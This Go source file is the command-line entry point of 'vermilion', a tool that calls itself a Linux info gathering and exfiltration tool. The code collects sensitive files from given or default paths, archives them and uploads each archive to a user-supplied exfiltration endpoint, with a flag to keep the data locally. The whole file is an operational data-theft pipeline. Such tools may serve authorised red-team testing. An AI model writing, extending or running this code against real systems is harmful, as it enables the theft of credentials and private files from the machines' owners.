package cmd

import (
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"

	"github.com/r3drun3/vermilion/internal"
	"github.com/spf13/cobra"
)

var (
	endpoint   string
	noExf      bool
	pathsInput string
)

func init() {
	// Add persistent flags only once
	rootCmd.PersistentFlags().StringVarP(&endpoint, "endpoint", "e", "", "Exfiltration endpoint URL")
	rootCmd.PersistentFlags().BoolVarP(&noExf, "noexf", "n", false, "Skip exfiltration and save locally")
	rootCmd.PersistentFlags().StringVarP(&pathsInput, "paths", "p", "", "Comma-separated list of paths to gather sensitive data from")
}

// Helper function to expand `~` in paths
func expandPath(path string) string {
	if len(path) > 1 && path[:2] == "~/" {
		usr, err := user.Current()
		if err != nil {
			fmt.Printf("Error retrieving current user: %v\n", err)
			return path // Return original if expansion fails
		}
		return filepath.Join(usr.HomeDir, path[2:])
	}
	return path
}

var rootCmd = &cobra.Command{
	Use:   "vermilion",
	Short: "Vermilion - Linux info gathering and exfiltration tool",
	Run: func(cmd *cobra.Command, args []string) {
		outputDir := "exdata"

		// Parse paths if provided and expand `~`
		var paths []string
		if pathsInput != "" {
			rawPaths := strings.Split(pathsInput, ",")
			for _, p := range rawPaths {
				paths = append(paths, expandPath(p))
			}
		}

		// Scan for sensitive files
		files, err := internal.ScanSensitiveFiles(outputDir, paths)
		if err != nil {
			fmt.Printf("Error scanning sensitive files: %v\n", err)
			return
		}
		fmt.Printf("Found %d sensitive files.\n", len(files))

		// Archive files
		archives, err := internal.CreateArchive(outputDir, files)
		if err != nil {
			fmt.Printf("Error creating archives: %v\n", err)
			return
		}
		fmt.Printf("Created %d archives.\n", len(archives))

		// Exfiltrate each archive if required
		if !noExf {
			for _, archivePath := range archives {
				fmt.Printf("Exfiltrating archive: %s\n", archivePath)
				err = internal.Exfiltrate(endpoint, archivePath)
				if err != nil {
					fmt.Printf("Error during exfiltration of %s: %v\n", archivePath, err)
					continue
				}
			}
			fmt.Println("Exfiltration completed.")
		} else {
			fmt.Println("Exfiltration skipped.")
		}
	},
}

// Execute is the entry point for the CLI
func Execute() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
